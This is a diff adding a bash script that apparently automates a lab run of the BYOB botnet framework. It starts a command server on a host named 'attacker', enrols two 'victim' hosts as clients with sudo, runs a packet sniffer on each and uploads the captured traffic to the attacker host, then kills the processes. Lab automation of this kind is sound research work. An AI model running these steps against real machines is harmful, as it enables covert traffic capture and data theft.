@@ -1,0 +1,52 @@
+#!/bin/bash
+
+remote_kill() {
+    node=$1
+    prog=$2
+    ssh $node "sudo kill \$(ps -e | grep $prog | awk '{print \$1}')"
+}
+
+
+
+ssh attacker "cd ~/byob && ./server.py" &
+attackerPid=$1
+
+sleep 10 # let the server boot
+
+ssh victim1 "sudo byob-client" &
+victimPid=$!
+
+ssh victim2 "sudo byob-client" &
+victimPid=$!
+
+
+sleep 5 # let the victim connect
+
+
+ssh attacker "byossh victim1 packetsniffer run"
+
+sleep 2
+
+ssh attacker "byossh victim2 packetsniffer run"
+
+sleep 5
+
+ssh attacker "byossh victim1 packetsniffer upload"
+ssh attacker "byossh victim2 packetsniffer upload"
+
+sleep 5
+
+
+# Kill byob on client via byob
+ssh attacker "byossh victim1 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
+ssh attacker "byossh victim1 sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
+
+ssh attacker "byossh victim2 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
+ssh attacker "byossh victim2 sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
+
+# Kill byob server on attacker
+remote_kill attacker server
+remote_kill attacker python
+
+sleep 8 # Make sure all the data downloads
+
